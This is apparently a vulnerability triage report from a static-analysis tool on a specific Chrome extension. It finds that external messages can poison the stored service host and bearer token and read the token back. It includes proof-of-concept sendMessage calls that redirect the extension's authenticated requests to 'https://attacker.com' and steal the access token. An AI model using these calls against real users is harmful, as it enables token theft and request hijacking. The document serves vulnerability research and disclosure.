# CoCo Analysis: inehghpkjjjdgpnagcbogckbonilnidc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 13 (2 storage write + 1 storage read/leak + 10 fetch/SSRF)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/inehghpkjjjdgpnagcbogckbonilnidc/opgen_generated_files/bg.js
Line 1318: const dgServiceHost = request.value;
Line 1321: chrome.storage.sync.set({ dgServiceHost: dgServiceHost + localPort }, function () {

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    const message = ((_a = request.message) === null || _a === void 0 ? void 0 : _a.message) || request.message;
    switch (message) {
        case EVENT_SET_SERVICE_HOST:
            const port = ':44300';
            const dgServiceHost = request.value; // ← attacker-controlled
            const serviceHostIsLocalAndMissingPort = dgServiceHost.includes('localhost') && !dgServiceHost.includes(port);
            const localPort = serviceHostIsLocalAndMissingPort ? port : '';
            chrome.storage.sync.set({ dgServiceHost: dgServiceHost + localPort }, function () {
                sendResponse(true);
            });
            break;
        case EVENT_GET_SERVICE_HOST:
            chrome.storage.sync.get('dgServiceHost', function (result) {
                sendResponse(result); // ← sends stored value back to attacker
            });
            break;
        case EVENT_SET_ACCESS_TOKEN:
            const token = request.token || ((_b = request.message) === null || _b === void 0 ? void 0 : _b.value); // ← attacker-controlled
            const storageValue = {};
            storageValue[BEARER_ACCESS_TOKEN] = token[BEARER_ACCESS_TOKEN] || token;
            chrome.storage.sync.set(storageValue, function () { // ← storage poisoning
                longPollNotifications(null);
                sendResponse(true);
            });
            break;
        case EVENT_GET_ACCESS_TOKEN:
            chrome.storage.sync.get(BEARER_ACCESS_TOKEN, function (result) {
                sendResponse((result === null || result === void 0 ? void 0 : result[BEARER_ACCESS_TOKEN]) || ''); // ← leaks token
            });
            break;
    }
});

// Storage value used in privileged fetch
function longPollNotifications(timer) {
    getAccessTokenAndSetHeader(function callback(storage) {
        fetch(`${dgServiceHost}/api/extension/notifications/userunreadnotificationscount?dg-casing=camel`, {
            method: 'GET',
            headers: {
                Authorization: `Bearer ${accessToken}`, // ← attacker-controlled from storage
            },
        })
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted domain (*.degreed.com or *.degreed.app)
// Attack 1: SSRF - Poison service host to attacker-controlled URL
chrome.runtime.sendMessage(
    'inehghpkjjjdgpnagcbogckbonilnidc',
    { message: 'setServiceHost', value: 'https://attacker.com' },
    function(response) {
        console.log('Service host poisoned');
    }
);

// Attack 2: Information disclosure - Read stored service host
chrome.runtime.sendMessage(
    'inehghpkjjjdgpnagcbogckbonilnidc',
    { message: 'getServiceHost' },
    function(response) {
        console.log('Leaked service host:', response);
    }
);

// Attack 3: Token theft - Read stored access token
chrome.runtime.sendMessage(
    'inehghpkjjjdgpnagcbogckbonilnidc',
    { message: 'getAccessToken' },
    function(response) {
        console.log('Stolen token:', response);
    }
);

// Attack 4: Token poisoning and SSRF
chrome.runtime.sendMessage(
    'inehghpkjjjdgpnagcbogckbonilnidc',
    { message: 'setAccessToken', token: 'attacker-token' },
    function(response) {
        // Extension will now use attacker's token in fetch requests
    }
);
```

**Impact:** Multiple vulnerabilities: (1) SSRF - attacker can poison dgServiceHost storage to redirect privileged fetch() requests to attacker-controlled URLs, (2) Information disclosure - attacker can read stored service host and access tokens via sendResponse, (3) Complete storage exploitation chain - attacker can set and retrieve arbitrary storage values. The extension has externally_connectable restricted to *.degreed.com and *.degreed.app domains, but per methodology rules, if even ONE domain can exploit it, this is TRUE POSITIVE.

---

## Sinks 2-13: bg_chrome_runtime_MessageExternal → fetch_resource_sink (multiple instances)

**Classification:** TRUE POSITIVE

**Reason:** These are all instances of the same SSRF vulnerability where attacker-controlled dgServiceHost from storage is used in fetch() URLs. CoCo detected this flow multiple times through different code paths, but they all stem from the ability to poison dgServiceHost via external messages and then have it used in `fetch(\`${dgServiceHost}/api/extension/...\`)` calls.
